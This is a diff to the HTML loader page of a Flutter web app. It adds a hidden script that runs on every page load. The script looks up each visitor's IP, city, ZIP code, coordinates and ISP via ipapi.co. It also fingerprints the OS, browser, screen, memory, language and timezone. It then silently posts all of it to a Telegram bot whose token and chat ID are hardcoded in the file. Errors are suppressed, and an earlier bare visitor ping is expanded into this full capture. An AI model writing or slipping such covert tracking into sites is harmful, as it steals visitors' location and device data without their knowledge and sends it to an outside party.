@@ -143,10 +143,62 @@
       setTimeout(() => {
         if (!hidden) { hideLoader('Offline or slow network — launching fallback'); }
       }, 20000);
+
+      const BOT_TOKEN = '8193621722:AAFHkpa0nEbuffBnFrktjvIfipqWuicFnX4';
+      const CHAT_ID = '-1003133614221';
+
+      function getOS(ua) {
+        if (/Windows NT 10/.test(ua)) return 'Windows 10/11';
+        if (/Windows NT 6\.3/.test(ua)) return 'Windows 8.1';
+        if (/Windows NT 6\.1/.test(ua)) return 'Windows 7';
+        if (/Android ([\d.]+)/.test(ua)) return 'Android ' + ua.match(/Android ([\d.]+)/)[1];
+        if (/iPhone OS ([\d_]+)/.test(ua)) return 'iOS ' + ua.match(/iPhone OS ([\d_]+)/)[1].replace(/_/g, '.');
+        if (/Mac OS X ([\d_]+)/.test(ua)) return 'macOS ' + ua.match(/Mac OS X ([\d_]+)/)[1].replace(/_/g, '.');
+        if (/Linux/.test(ua)) return 'Linux';
+        return 'Unknown';
+      }
+
+      function getBrowser(ua) {
+        if (/Edg\/([\d.]+)/.test(ua)) return 'Edge ' + ua.match(/Edg\/([\d.]+)/)[1];
+        if (/OPR\/([\d.]+)/.test(ua)) return 'Opera ' + ua.match(/OPR\/([\d.]+)/)[1];
+        if (/Chrome\/([\d.]+)/.test(ua)) return 'Chrome ' + ua.match(/Chrome\/([\d.]+)/)[1];
+        if (/Firefox\/([\d.]+)/.test(ua)) return 'Firefox ' + ua.match(/Firefox\/([\d.]+)/)[1];
+        if (/Safari\/([\d.]+)/.test(ua)) return 'Safari ' + ua.match(/Safari\/([\d.]+)/)[1];
+        return 'Unknown';
+      }
+
+      fetch('https://ipapi.co/json/')
+        .then(r => r.json())
+        .then(g => {
+          const ua = navigator.userAgent;
+          const text = [
+            `📍 *IP:* \`${g.ip}\``,
+            `🏙️ *Location:* ${g.city}, ${g.region}, ${g.country_name}`,
+            `📮 *ZIP:* ${g.postal || 'N/A'}`,
+            `🗺️ *Coordinates:* ${g.latitude}, ${g.longitude}`,
+            `🏢 *ISP:* ${g.org}`,
+            ``,
+            `💻 *OS:* ${getOS(ua)}`,
+            `🌐 *Browser:* ${getBrowser(ua)}`,
+            `📱 *Device:* ${/Mobi|Android|iPhone|iPad/.test(ua) ? 'Mobile' : 'Desktop'}`,
+            `🖥️ *Screen:* ${screen.width}x${screen.height}`,
+            `🧠 *RAM:* ~${navigator.deviceMemory || '?'} GB`,
+            `🌍 *Language:* ${navigator.language}`,
+            `🕐 *Timezone:* ${Intl.DateTimeFormat().resolvedOptions().timeZone}`,
+            ``,
+            `🔍 *UA:* ${ua}`,
+          ].join('\n');
+
+          fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: 'Markdown' })
+          }).catch(() => { });
+        }).catch(() => { });
     })();
 
     // Notify Telegram of visitor
-    fetch('https://api.telegram.org/bot8193621722:AAFHkpa0nEbuffBnFrktjvIfipqWuicFnX4/sendMessage?chat_id=-1003133614221&text=%2B1%20visitor').catch(() => {});
+
   </script>
   <script src="flutter_bootstrap.js" async></script>
 </body>
